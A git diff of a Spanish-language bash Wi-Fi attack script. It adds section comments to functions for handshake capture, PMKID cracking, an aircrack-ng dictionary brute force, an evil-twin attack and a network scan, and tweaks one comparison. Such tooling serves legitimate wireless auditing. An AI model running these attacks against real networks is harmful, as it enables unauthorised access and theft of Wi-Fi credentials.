@@ -10,7 +10,7 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 cleancolor="echo -e "${endColour}""
-
+# Comprobacion e instalacion de la dependencias
 programs() {
 	clear
 	tput civis
@@ -31,7 +31,7 @@ programs() {
 		fi
 	done
 }
-
+# 1) ataque
 handshake_ataque() {
 	clear
 	echo -e "\n${turquoiseColour}[*] Iniciando Ataque Handshake"
@@ -80,7 +80,7 @@ handshake_ataque() {
 		echo -e "${redColour}\n [!] No se ha capturado el Handshake"
 	fi
 }
-
+# 2) ataque
 pkmid_ataque() {
 	clear
 	echo -e "\n${greenColour}[*] Iniciando ataque PMKID..\n"
@@ -95,7 +95,7 @@ pkmid_ataque() {
 	sleep 2
 	$cleancolor
 	test -f HashPKMID*
-	if [ "$(echo $?)" == "0" ]; then
+	if [ "$(echo $?)" -eq 0 ]; then
 		echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
 		sleep 1
 		tput cnorm
@@ -109,7 +109,7 @@ pkmid_ataque() {
 	exit
 	fi
 }
-
+# 3) ataque
 fuerza_ataque() {
 	clear
 	echo -e "\n${greenColour}[*] Iniciando Ataque de Fuerza Bruta"
@@ -121,7 +121,7 @@ fuerza_ataque() {
 	tput civis; read -p "[?] Ruta del Diccionario al usar: " dicc
 	xterm -hold -e "aircrack-ng -w $dicc $cap"
 }
-
+# 4) ataque
 evil_ataque() {
 	clear; echo -e "\n${grayColour}[*] Iniciando Ataque evilTrust by S4vitar..."
 	airmon-ng stop ${tar}mon > /dev/null 2>&1
@@ -138,7 +138,7 @@ evil_ataque() {
 	cd .. 
 	sudo rm -r evilTrust
 }
-
+# 5) ataque
 scanner() {
 	clear; echo -e "\n${greenColour}[*] Iniciando Scanner de la red"
 	airmon-ng stop ${tar}mon > /dev/null 2>&1
@@ -153,7 +153,7 @@ scanner() {
 	echo -e "\n---------------------------------------------------"
 	read -p "Enter para salir: "
 }
-
+# salida
 salir() {
 	echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
 	airmon-ng stop ${tar}mon > /dev/null 2>&1
@@ -165,11 +165,11 @@ salir() {
 	tput cnorm
 	exit
 }
-
+# Comprobacion si el usuario es root
 if [ $(id -u) -ne 0 ]; then
 	echo -e "$redColour\n[!] Debes ser root para ejecutar la herramienta -> (sudo $0)"
 	exit 1
-
+# Programa principal
 else
 	programs
 	clear
